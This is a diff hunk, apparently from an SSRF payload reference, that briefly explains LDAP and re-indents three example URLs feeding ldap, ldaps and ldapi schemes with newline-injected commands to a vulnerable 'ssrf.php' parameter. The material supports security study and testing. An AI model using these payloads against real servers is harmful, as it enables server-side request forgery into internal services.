@@ -131,9 +131,9 @@
 LDAP stands for Lightweight Directory Access Protocol.
 It is an application protocol used over an IP network to manage and access the distributed directory information service.
 
-      http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit
-      http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit
-      http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
+     http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit
+     http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit
+     http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
   
   
     
